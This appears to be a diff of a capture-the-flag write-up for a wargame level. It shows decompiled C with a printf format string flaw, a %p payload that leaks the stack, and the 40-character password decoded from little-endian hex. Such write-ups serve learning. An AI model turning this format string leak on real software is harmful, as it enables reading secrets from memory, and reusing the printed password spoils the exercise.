@@ -1,11 +1,14 @@
+## Step 1: Static & Dynamic Analysis
+
+```c
 int main(int argc, const char **argv, const char **envp)
 {
-  char name[100]; // [rsp+B0h] [rbp-70h] BYREF
-  char password[118]; // [rsp+10h] [rbp-110h] BYREF
-  char buffer[48]; // [rsp+80h] [rbp-A0h] BYREF
+  char name[100];
+  char password[118];
+  char buffer[48];
   int v5;
   int v8;
-  int v9;
+  int fd;
   FILE *stream
 
   memset(name, 0, sizeof(s));
@@ -13,17 +16,17 @@ int main(int argc, const char **argv, const char **envp)
   memset(buffer, 0, 41);
   memset(password, 0, sizeof(password));
   v5 = 0;
-  stream = 0LL;
-  v9 = 0;
+  stream = 0;
+  fd = 0;
   stream = fopen("/home/users/level03/.pass", "r");
   if ( !stream )
   {
     fwrite("ERROR: failed to open password file\n", 1, 36, stderr);
     exit(1);
   }
-  v9 = fread(buffer, 1, 0x29, stream);
+  fd = fread(buffer, 1, 41, stream);
   buffer[strcspn(buffer, "\n")] = 0;
-  if ( v9 != 41 )
+  if ( fd != 41 )
   {
     fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
     fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
@@ -50,14 +53,27 @@ int main(int argc, const char **argv, const char **envp)
   printf("Greetings, %s!\n", name);
   system("/bin/sh");
 }
+```
+### Explanation
 
-The binary stores wordpass of the next level on a buffer on the stack, then takes 2 inputs using `fgets()`:
-a name and a password and finally checks if the buffer() is equal to the `name` variable.
+The binary start by putting the wordpass of 40 characters of the next level into a `buffer` on the stack.
 
-the issue is that if buffer ain't equal to the name the name is passed directly into printf() resulting in a printf format string vulnerability
+```c
+fd = fread(buffer, 1, 41, stream);
+```
 
+Then, 2 inputs using `fgets()` are taken: a `name` and a `password`.
+Finally a comparison between the `buffer` containing the password is equal to the `name`.
 
+The issue results in the fact that if the the comparison listed just above is false, our input `name` will be passed 
+as parameter to `printf()` creating a **printf format string vulnerability* that will enable us to read what's on the stack.
 
+## Step 2: Exploiting the Binary
+
+To achieve it, we're going to use the `%p` format specifier to print addresses's content in hexadecimal
+and see the wordpass ASCII characters of the next level on the stack.
+
+```bash
 level02@OverRide:~$ ./level02 
 ===== [ Secure Access System v1.0 ] =====
 /**\
@@ -66,12 +82,21 @@ level02@OverRide:~$ ./level02
 --[ Username: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
 --[ Password: 
 *
-0x7fffffffe500(nil)(nil)0x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6f80x1f7ff9a08(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d0xfeff00 does not have access!
+0x7fffffffe500(nil)(nil)0x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6f80x1f7ff9a08
+(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)
+0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d0xfeff00 does not have access!
+```
 
-756e505234376848    unPR47hH                  
-45414a3561733951    EAJ5as9Q
-377a7143574e6758    7zqCWNgX
-354a35686e475873    5J5hnGXs
-48336750664b394d    H3gPfK9M
+Here are the 5 bytes containing every characters that constitutes the password to reverse
+because each addresses's content are displayed in little endian.  
 
-Hh74RPnu Q9sa5JAE XgNWCqz7 sXGnh5J5 M9KfPg3H
+```
+756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d
+unPR47hH         EAJ5as9Q         7zqCWNgX         5J5hnGXs         H3gPfK9M
+```
+
+giving this password:
+
+```
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+```
